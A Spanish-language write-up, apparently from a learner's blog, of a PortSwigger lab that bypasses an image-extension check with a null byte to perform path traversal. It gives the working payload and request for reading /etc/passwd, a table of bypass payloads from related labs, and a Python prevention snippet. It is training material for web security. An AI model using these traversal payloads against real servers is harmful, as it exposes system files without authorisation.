---
title: "Lab: File path traversal, validation of file extension with null byte bypass"
date: 2026-05-18
category: "Path Traversal"
order: 7
tags: ["web-security-academy", "path-traversal", "lab"]
layout: layouts/writeup.njk
permalink: /writeups/path-traversal-lab-null-byte-bypass.html
---

## Descripción de la vulnerabilidad

Esta variante de Path Traversal tiene un filtro que **valida que el filename termine con una extensión de imagen permitida** — como `.jpg`, `.png`. Si el valor no termina con una extensión válida, la app lo rechaza.

El bypass es el **null byte** (`%00`) — un carácter especial que en lenguajes como C y PHP termina la cadena de texto. Se inserta entre el payload real y la extensión falsa, haciendo que la app vea la extensión válida pero el SO lea solo hasta el null byte.

---

## Concepto clave: el null byte (`%00`)

El null byte es el carácter con valor ASCII 0. En lenguajes que manejan strings al estilo C (como PHP y C mismo), el null byte **termina la cadena** — todo lo que viene después es ignorado.

**Sin null byte:**

```
../../../etc/passwd.jpg
```

La app ve `.jpg` al final → pasa la validación. El SO busca el archivo `/etc/passwd.jpg` → no existe.

**Con null byte:**

```
../../../etc/passwd%00.jpg
```

La app ve `.jpg` al final → pasa la validación. El SO encuentra `%00` y **termina la cadena ahí** → lee `/etc/passwd`.

El null byte actúa como separador invisible — la app valida lo que está después, pero el SO ignora todo lo que está después del `%00`.

---

## Reconocimiento

Mismo vector de siempre — parámetro `filename` interactuando con el filesystem:

```
GET /image?filename=65.jpg
```

La diferencia con labs anteriores es que aquí el filename ya viene con extensión `.jpg` — pista de que la app podría estar validando la extensión.

---

## Pruebas realizadas

### Payloads que fallaron ❌

<table>
<tr><td>Payload</td><td>Razón</td></tr>
<tr><td><code>../../../etc/passwd</code></td><td>Sin extensión válida — rechazado</td></tr>
<tr><td><code>/etc/passwd</code></td><td>Sin extensión válida — rechazado</td></tr>
<tr><td><code>%2Fetc%2Fpasswd</code></td><td>Sin extensión válida — rechazado</td></tr>
<tr><td><code>../../../etc/passwd.jpg</code></td><td>Con extensión, pero el SO busca <code>/etc/passwd.jpg</code> — no existe</td></tr>
<tr><td><code>../../../etc/passwd.jp</code></td><td>Extensión incompleta — rechazado</td></tr>
<tr><td><code>/etc/passwd.jpg</code></td><td>Ruta absoluta con extensión — no existe ese archivo</td></tr>
<tr><td><code>..%2F..%2F..%2Fetc%2Fpasswd%2500.png</code></td><td>Doble encoding del null byte (<code>%2500</code>) — el servidor lo interpreta como <code>%00</code> literal, no como null byte</td></tr>
</table>

### El que casi funcionaba — `../../../etc/passwd.jpg`

Este payload pasaba la validación de extensión pero el SO buscaba literalmente `/etc/passwd.jpg` — un archivo que no existe. Solo faltaba el null byte para truncar la extensión.

### Intento adicional — ruta absoluta con null byte ❌

```
/etc/passwd%00.png
```

El null byte está correcto, pero la ruta absoluta es bloqueada por el filtro antes de que el null byte tenga efecto.

### Payload que funcionó ✅

```
../../../etc/passwd%00.png
```

La app ve `.png` al final → validación de extensión pasa. El SO encuentra `%00` → trunca la cadena → lee `/etc/passwd`.

---

## Explotación exitosa

```
GET /image?filename=../../../etc/passwd%00.png
```

**Respuesta:** `200 OK` — contenido completo de `/etc/passwd`.

---

## ¿Por qué `%2500` no funcionó pero `%00` sí?

`%2500` es **doble encoding** del null byte: `%00` encodeado → `%2500`. El servidor decodifica `%2500` → obtiene `%00` como string literal, no como null byte real.

El null byte necesita llegar al servidor **sin doble encoding** para que funcione. `%00` se decodifica directamente al carácter null byte real. `%2500` se decodifica a los caracteres `%`, `0`, `0` — que no terminan ninguna cadena.

---

## ¿En qué lenguajes funciona el null byte?

**Funciona en:** PHP (versiones antiguas, antes de 5.3.4), C / C++, algunos frameworks que usan librerías de C internamente.

**No funciona en:** Python, Java, Node.js, PHP moderno (5.3.4+).

Por eso en los labs anteriores el null byte no funcionó — dependiendo del stack del servidor, puede o no ser efectivo. En este lab el servidor usa un stack donde sí funciona.

---

## Comparativa completa de todos los labs

<table>
<tr><td>Lab</td><td>Filtro</td><td>Bypass</td><td>Clave</td></tr>
<tr><td>Simple case</td><td>Sin filtro</td><td><code>../../../etc/passwd</code></td><td>Nada que bypassear</td></tr>
<tr><td>Absolute path bypass</td><td>Bloquea <code>../</code></td><td><code>/etc/passwd</code></td><td>No valida prefijo</td></tr>
<tr><td>Stripped non-recursively</td><td>Elimina <code>../</code> una vez</td><td><code>....//....//....//etc/passwd</code></td><td>Filtro no es recursivo</td></tr>
<tr><td>Superfluous URL-decode</td><td>Bloquea <code>../</code>, decodifica después</td><td><code>..%252F..%252F..%252Fetc%252Fpasswd</code></td><td>Doble encoding</td></tr>
<tr><td>Validation of start of path</td><td>Exige prefijo <code>/var/www/images/</code></td><td><code>/var/www/images/../../../etc/passwd</code></td><td>Incluir prefijo + traversal</td></tr>
<tr><td>Validation of file extension (este)</td><td>Exige extensión <code>.jpg</code>/<code>.png</code></td><td><code>../../../etc/passwd%00.png</code></td><td>Null byte trunca la extensión</td></tr>
</table>

---

## Prevención correcta

Además de `realpath()`, la app debería validar la extensión **después** de resolver la ruta, no antes:

```python
import os

BASE = "/var/www/images"
ALLOWED_EXTENSIONS = [".jpg", ".png", ".gif"]
filename = request.params["filename"]

# 1. Resolver la ruta completa
full_path = os.path.realpath(os.path.join(BASE, filename))

# 2. Validar que esté dentro del directorio base
if not full_path.startswith(BASE):
    return 400, "Acceso denegado"

# 3. Validar extensión sobre la ruta ya resuelta
_, ext = os.path.splitext(full_path)
if ext.lower() not in ALLOWED_EXTENSIONS:
    return 400, "Extensión no permitida"

open(full_path)
```

Con esto, el null byte no tiene efecto porque `realpath()` resuelve la ruta real antes de cualquier validación.

---

## Lecciones aprendidas

- Si el parámetro en el HTML ya tiene extensión (`.jpg`), la app probablemente valida la extensión del filename.
- `../../../etc/passwd.jpg` pasa la validación pero el archivo no existe — el null byte es lo que completa el bypass.
- El null byte `%00` termina la cadena en lenguajes estilo C — todo lo que viene después es ignorado por el SO.
- `%2500` no funciona como null byte — es doble encoding que el servidor decodifica a `%00` como texto, no como carácter null real.
- El null byte solo funciona en stacks vulnerables (PHP antiguo, C) — en Python, Java o Node.js no tiene efecto.
- La validación de extensión debe hacerse sobre la ruta ya resuelta, no sobre el input crudo.

---

## Referencia

Lab oficial: [PortSwigger — File path traversal, validation of file extension with null byte bypass](https://portswigger.net/web-security/file-path-traversal)

**Estado:** Solved
